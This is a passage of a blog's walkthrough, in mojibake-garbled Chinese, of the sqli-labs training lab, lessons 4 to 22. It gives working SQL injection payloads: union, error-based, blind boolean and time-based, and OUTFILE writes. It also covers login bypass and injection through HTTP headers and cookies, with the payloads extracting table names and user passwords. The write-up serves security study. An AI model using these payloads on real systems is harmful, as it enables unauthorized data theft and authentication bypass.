title="Less-4"></a>Less-4</h2><p>æŸ¥çœ‹æºç ï¼Œidä¸¤è¾¹åŠ äº†â€,ç”¨<code>?id=-1&quot;)</code>é—­åˆ</p><hr><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p><strong><em>åŒæ³¨å…¥</em></strong></p><ol><li>Rand() //éšæœºå‡½æ•°</li><li>Floor() //å–æ•´å‡½æ•°</li><li>Count() //æ±‡æ€»å‡½æ•°</li><li>Group by clause //åˆ†ç»„è¯­å¥</li></ol><p><a href="https://blog.csdn.net/Leep0rt/article/details/78556440" target="_blank" rel="noopener">https://blog.csdn.net/Leep0rt/article/details/78556440</a></p><p><code>?id=1&#39; union select count(*),1,concat((select database()), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbMSh9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kbMSh9.png" alt="kbMSh9.png"></a><br>select æŸ¥è¯¢åˆ—æ•°è¦ç›¸åŒï¼Œå¦åˆ™æŠ¥é”™</p><p><code>?id=1&#39; union select count(*),1,concat((select password from users limit 5,1), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbQiCj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kbQiCj.png" alt="kbQiCj.png"></a><br>ç”¨<code>group_concat</code>ä¼šæŠ¥é”™ï¼Œä½¿ç”¨<code>limit</code></p><p>æ›´æ–°äº2019-03-01 22:21:15 æ˜ŸæœŸäº”</p><hr><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>å°è¯•æ³¨å…¥åå¯çŸ¥æ˜¯ç”¨<code>&quot;</code>é—­åˆï¼Œå­—ç¬¦ä¸²å‹<br>å…¶ä»–å’Œä¸Šé¢˜ä¸€è‡´<br><code>?id=1&quot;  union select count(*),concat( (select user()),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p><p><a href="https://imgchr.com/i/kLirA1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLirA1.png" alt="kLirA1.png"></a></p><p><code>?id=1&quot;  union select count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 3,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p><p><code>?id=1&quot;  union select count(*),concat( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 5,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p><p><code>?id=1&quot;  union select count(*),concat( (select password from users limit 0,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p><p>æ›´æ–°äº2019-03-03 11:48:51 æ˜ŸæœŸæ—¥</p><hr><h2 id="Lss-7"><a href="#Lss-7" class="headerlink" title="Lss-7"></a>Lss-7</h2><h5 id="åˆ©ç”¨outfileæ–‡ä»¶"><a href="#åˆ©ç”¨outfileæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨outfileæ–‡ä»¶"></a>åˆ©ç”¨outfileæ–‡ä»¶</h5><p><em>ä¸€èˆ¬åœ¨SqlæŸ¥è¯¢è¯­å¥ä¸­ï¼Œæƒ³è¦æ­£å¸¸æŸ¥è¯¢åˆ°ä¿¡æ¯ï¼Œåªèƒ½åœ¨æœ€é‡Œå±‚æœ‰å¼•å·ï¼Œå¤–å±‚å…¨æ˜¯å°æ‹¬å·ã€‚å³å·²çŸ¥æ³¨å…¥ç±»å‹åä¾æ¬¡å¢åŠ æ‹¬å·æ•°å¿…èƒ½åˆ†æå‡ºæ‹¬å·æ•°ï¼ˆå­˜åœ¨æ³¨å…¥ç‚¹ï¼‰ã€‚<br>æ•°æ®åº“çš„fileæƒé™è§„å®šäº†æ•°æ®åº“ç”¨æˆ·æ˜¯å¦æœ‰æƒé™å‘æ“ä½œç³»ç»Ÿå†…å†™å…¥å’Œè¯»å–å·²å­˜åœ¨çš„æƒé™<br>éœ€è¦åœ¨æŒ‡å®šçš„ç›®å½•ä¸‹è¿›è¡Œæ•°æ®çš„å¯¼å‡ºã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯åˆ©ç”¨æ•°æ®åº“fileæƒé™å‘æ“ä½œç³»ç»Ÿå†™å…¥æ–‡ä»¶æ—¶ï¼Œ å¯¹äºç›¸åŒæ–‡ä»¶åçš„æ–‡ä»¶ä¸èƒ½è¦†ç›–</em></p><p><em>secure_file_privè¿™ä¸ªå‚æ•°ç”¨æ¥é™åˆ¶æ•°æ®å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œçš„æ•ˆæœï¼Œä¾‹å¦‚æ‰§è¡Œload dataã€into outfileè¯­å¥å’Œload_file()å‡½æ•°,è¿™äº›æ“ä½œéœ€è¦ç”¨æˆ·å…·æœ‰fileæƒé™ã€‚</em></p><ol><li>å¦‚æœè¿™ä¸ªå‚æ•°ä¸ºç©ºï¼Œè¿™ä¸ªå˜é‡æ²¡æœ‰æ•ˆæœã€‚</li><li>å¦‚æœè¿™ä¸ªå‚æ•°è®¾ä¸ºä¸€ä¸ªç›®å½•åï¼ŒMysqlæœåŠ¡åªå…è®¸åœ¨è¿™ä¸ªç›®å½•ä¸­æ‰§è¡Œæ–‡ä»¶çš„å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œã€‚è¿™ä¸ªç›®å½•å¿…é¡»å­˜åœ¨ï¼ŒMySQLæœåŠ¡ä¸ä¼šåˆ›å»ºå®ƒ.</li><li>å¦‚æœè¿™ä¸ªå‚æ•°ä¸ºnullï¼ŒMysqlæœåŠ¡ä¼šç¦æ­¢å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œã€‚è¿™ä¸ªå‚æ•°åœ¨MySQL 5.7.6ç‰ˆæœ¬å¼•å…¥ã€‚</li></ol><p><em>@@datadir è¯»å–æ•°æ®åº“è·¯å¾„<br>@@basedir MYSQL è·å–å®‰è£…è·¯å¾„</em></p><p><em>åœ¨Mysqlä¸­ï¼Œéœ€è¦æ³¨æ„è·¯å¾„è½¬ä¹‰çš„é—®é¢˜ï¼Œå³ç”¨\åˆ†éš”ã€‚</em></p><p><strong><a href="https://www.jianshu.com/p/7b9256de20d1" target="_blank" rel="noopener">https://www.jianshu.com/p/7b9256de20d1</a></strong></p><p>ç»è¿‡æµ‹è¯•ï¼Œç”¨<code>&#39;))</code> æ¥é—­åˆ</p><p><code>?id=1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;C:\\xampp\\mysql\\data\\security\\4.txt&quot; --+</code></p><p><a href="https://imgchr.com/i/kXV2Tg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/04/kXV2Tg.png" alt="kXV2Tg.png"></a></p><p><code>?id=1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;) into outfile &quot;C:\\xampp\\mysql\\data\\security\\5.txt&quot; --+</code></p><p><a href="https://imgchr.com/i/kXVb0U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/04/kXVb0U.png" alt="kXVb0U.png"></a></p><p><code>?id=1&#39;)) union select 1,2,(select group_concat(password) from users) into outfile &quot;C:\\xampp\\mysql\\data\\security\\6.txt&quot; --+</code></p><p><a href="https://imgchr.com/i/kXZS6x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/04/kXZS6x.png" alt="kXZS6x.png"></a></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><h5 id="ç›²æ³¨å¸ƒå°”æ³¨å…¥"><a href="#ç›²æ³¨å¸ƒå°”æ³¨å…¥" class="headerlink" title="ç›²æ³¨å¸ƒå°”æ³¨å…¥"></a>ç›²æ³¨å¸ƒå°”æ³¨å…¥</h5><p><em>å½“ä¸€ä¸ªé¡µé¢ï¼Œå­˜åœ¨æ³¨å…¥ï¼Œæ²¡æ˜¾ç¤ºä½ï¼Œæ²¡æœ‰æ•°æ®åº“å‡ºé”™ä¿¡æ¯ï¼Œåªèƒ½é€šè¿‡é¡µé¢è¿”å›æ­£å¸¸ä¸æ­£å¸¸è¿›è¡Œåˆ¤æ–­è¿›è¡Œsqlæ³¨å…¥ã€‚</em></p><ol><li>existsï¼ˆï¼‰<br>ç”¨äºæ£€æŸ¥  å­æŸ¥è¯¢æ˜¯å¦æœ‰è¿”å›æ•°æ®ã€‚ ç»“æœæ˜¯ tureæˆ–è€…false</li><li>asciiï¼ˆï¼‰<br>æŠŠå­—ç¬¦è½¬åŒ–æˆasciiç </li><li>substrï¼ˆï¼‰<br>substrï¼ˆstring stringï¼Œnum startï¼Œnum lengthï¼‰ï¼›<br>åç§»ä»1å¼€å§‹çš„ å¹¶ä¸æ˜¯0ï¼›</li></ol><p><em>DISTINCT å»é‡å¤</em><br><code>?id=1&#39; and (select ascii(substr( (select database()) ,1,1))&gt;115) --+</code></p><p><code>?id=1&#39; and ((select count(distinct+table_schema) from information_schema.tables)&gt;6)--+</code></p><p><code>?id=1&#39; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101)--+</code></p><p><code>?id=1&#39; and (select ascii(substr( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1) ,1,1))&gt;11) --+</code></p><p><code>?id=1&#39; and (select ascii(substr( (select password from users limit 0,1) ,1,1))&gt;68) --+</code></p><p><em>select database() ä½œä¸ºä¸€ä¸ªè¯­å¥åŠ æ‹¬å·</em><br>ç”¨è„šæœ¬æ¥è·‘</p><p>æ›´æ–°äº2019-03-04 23:09:10 æ˜ŸæœŸä¸€</p><hr><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><h5 id="ç›²æ³¨åŸºäºæ—¶é—´"><a href="#ç›²æ³¨åŸºäºæ—¶é—´" class="headerlink" title="ç›²æ³¨åŸºäºæ—¶é—´"></a>ç›²æ³¨åŸºäºæ—¶é—´</h5><p><em>if( expr1 , expr2 , expr3 ) expr1 true è¿”å›expr2 false è¿”å› expr3</em></p><p><code>?id=1&#39; and if((select ascii(substr(database(),1,1)))=115,sleep(5),1) --+</code></p><p>åˆ©ç”¨é¡µé¢è¿”å›æ—¶é—´åˆ¤æ–­å¯¹é”™<br>ä¾‹å¦‚<br><code>?id=1&#39; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101,sleep(5),1) --+</code></p><hr><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>ä¸ä¸Šé¢˜ç›¸åŒï¼Œä¸è¿‡åˆ©ç”¨<code>&quot;</code>è¿›è¡Œé—­åˆ</p><p>æ›´æ–°äº2019-03-06 20:29:31 æ˜ŸæœŸä¸‰</p><hr><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><pre><code>GET - ä»æŒ‡å®šçš„èµ„æºè¯·æ±‚æ•°æ®ã€‚POST - å‘æŒ‡å®šçš„èµ„æºæäº¤è¦è¢«å¤„ç†çš„æ•°æ®</code></pre><p>è¾“å…¥<code>&#39;</code>æŠ¥é”™ï¼ŒçŸ¥ç”¨<code>&#39;</code>é—­åˆ<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; or &#39;1&#39;=&#39;1&amp;submit=Submit</code><br>å¯ä»¥ç›´æ¥çˆ†å‡ºæ¥<br>å…¶ä»–ç›¸åŒ<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; union select 1,2#&amp;submit=Submit</code><br><a href="https://imgchr.com/i/A9VId1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9VId1.png" alt="A9VId1.png"></a></p><hr><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>å®éªŒå¯çŸ¥ç”¨<code>&quot;)</code>é—­åˆ<br>å…¶ä»–ç›¸åŒ</p><hr><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>å®éªŒçŸ¥ç”¨<code>&#39;)</code> é—­åˆ<br>å…¶ä»–ç›¸åŒï¼Œä¾‹å¦‚</p><p><code>uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(database()))) #&amp;submit=Submit</code></p><p><a href="https://imgchr.com/i/A9aHHI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9aHHI.png" alt="A9aHHI.png"></a></p><p><code>uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) #&amp;submit=Submit</code></p><p><a href="https://imgchr.com/i/A9azvQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9azvQ.png" alt="A9azvQ.png"></a></p><hr><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>å®éªŒçŸ¥ç”¨<code>&quot;</code>é—­åˆ<br>å…¶ä»–å’Œä¸Šé¢˜ç›¸åŒ</p><hr><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>å®éªŒçŸ¥ç”¨<code>&#39;</code>é—­åˆ<br>ä½†æ²¡ç”¨æŠ¥é”™ä¿¡æ¯<br>æ‰€ä»¥ä½¿ç”¨æ—¶é—´æˆ–å¸ƒå°”æ³¨å…¥<br><code>uname=&#39; or if(ascii(substr(database(),1,1))=115,sleep(0.5),1) #&amp;passwd=1&amp;submit=Submit</code></p><hr><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>å®éªŒçŸ¥ç”¨<code>&quot;</code>é—­åˆ<br>å…¶ä»–å’Œä¸Šé¢˜ç›¸åŒ</p><hr><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>åœ¨unameä¸­æ³¨å…¥ï¼Œéƒ½æ²¡æœ‰ååº”<br>åœ¨passwordä¸­æ³¨å…¥ï¼Œä¹Ÿæ²¡æœ‰ååº”<br>åçŸ¥å…ˆéªŒè¯ç”¨æˆ·åæ­£ç¡®åï¼Œæ‰æ‰§è¡Œpassword</p><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p><code>uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,version(),0x7e),1)# &amp;submit=Submit</code></p><p><a href="https://imgchr.com/i/A98NW9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A98NW9.png" alt="A98NW9.png"></a></p><p><code>uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)# &amp;submit=Submit</code></p><p><a href="https://imgchr.com/i/A9JFUS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9JFUS.png" alt="A9JFUS.png"></a><br>å…¶ä»–ç›¸åŒ</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>ä½¿ç”¨æ­£ç¡®è´¦å·å¯†ç åï¼Œé¡µé¢æ˜¾ç¤ºuser-agentï¼Œåˆ™å¯ä»¥åœ¨è¿™ä¸Šé¢æ³¨å…¥</p><p><code>1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9Nzi8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9Nzi8.png" alt="A9Nzi8.png"></a><br><code>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9UGo6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9UGo6.png" alt="A9UGo6.png"></a><br>å…¶ä»–ç›¸åŒ<br><em>HTTP è¯·æ±‚å¤´ä¸­é™¤äº† User-Agentå¯èƒ½å­˜åœ¨sqlæ³¨å…¥æ„å¤–ï¼Œè¿˜æœ‰refererã€X-Forwarded-Forå¯èƒ½å­˜åœ¨sqlæ³¨å…¥ã€‚</em></p><p>æ›´æ–°äº2019-03-10 22:43:03 æ˜ŸæœŸæ—¥</p><hr><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>å‚è€ƒä¸Šé¢˜<br>è¾“å…¥æ­£ç¡®ç”¨æˆ·å’Œå¯†ç åï¼Œè·³å‡ºé¡µé¢</p><p><a href="https://imgchr.com/i/ACy1bD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/11/ACy1bD.png" alt="ACy1bD.png"></a></p><p>å·®ä¸å¤šçŸ¥é“åœ¨<code>referer</code>ä¸Šæ³¨å…¥<br><code>&#39; and (extractvalue(1,concat(0x7e,(select version()),0x7e)) ) and &#39;1&#39;=&#39;1</code><br>ä¸èƒ½ç”¨<code>#</code>æ³¨é‡Šï¼Œå› ä¸ºåé¢è¿˜æœ‰è¯­å¥å­˜åœ¨</p><p><a href="https://imgchr.com/i/ACyvqO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/11/ACyvqO.png" alt="ACyvqO.png"></a></p><p><code>&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x7e)) ) and &#39;1&#39;=&#39;1</code></p><p><a href="https://imgchr.com/i/AC6Kij" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/11/AC6Kij.png" alt="AC6Kij.png"></a></p><p>æ›´æ–°äº2019-03-10 22:43:03 æ˜ŸæœŸæ—¥</p><hr><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>ç”±é¢˜ç›®çŸ¥æ³¨å…¥ç‚¹åœ¨Cookieä¸­</p><p><em>è¿™é‡Œæˆ‘çŠ¯äº†ä¸ªé”™è¯¯ï¼Œç”±äºæ²¡æœ‰æ‹¦æˆªï¼Œä¿®æ”¹Cookieåï¼Œç›´æ¥ç‚¹åˆ·æ–°ä¸ä¼šå‡ºç»“æœï¼Œéœ€è¦é‡æ–°è½½å…¥é¡µé¢</em></p><p>è¾“å…¥<code>&#39;</code><br><a href="https://imgchr.com/i/AkUjaj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/AkUjaj.th.png" alt="AkUjaj.th.png"></a><br>æŠ¥é”™å­˜åœ¨æ³¨å…¥ç‚¹</p><p>æ¥ä¸‹æ¥å¯ä»¥ç”¨ç¬¬ä¸€é¢˜ç”¨çš„<br><code>&#39; union select 1,2,database()#</code><br><a href="https://imgchr.com/i/AkU7xf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/AkU7xf.th.png" alt="AkU7xf.th.png"></a></p><p><code>&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema =database()#</code><br><a href="https://imgchr.com/i/Akauz6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/Akauz6.th.png" alt="Akauz6.th.png"></a></p><p>ä¹Ÿå¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥<br><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code><br><a href="https://imgchr.com/i/AkaQsO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/AkaQsO.th.png" alt="AkaQsO.th.png"></a></p><hr><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>æŸ¥çœ‹Cookie<br><code>YWRtaW4</code>è¿›è¡Œè§£å¯†ï¼ŒçŸ¥æ˜¯ç”¨base64åŠ å¯†çš„<code>admin</code><br>æ‰€ä»¥åªè¦å°†ä¸Šé¢˜å†…å®¹åŠ å¯†å³å¯</p><hr><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>æŸ¥çœ‹cookie<br><code>admin&#39; and 1=1 #</code>æ²¡æœ‰æŸ¥è¯¢ç»“æœ<br><code>admin&quot; and 1=1 #</code>ç»“æœæ­£ç¡®<br>çŸ¥æ˜¯ç”¨<code>&quot;</code>é—­åˆ<br>å…¶ä»–æ–¹æ³•ä¸å‰é¢˜ç›¸åŒ</p><p>æ›´æ–°äº2019-03-13 20:26:48 æ˜ŸæœŸä¸‰</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
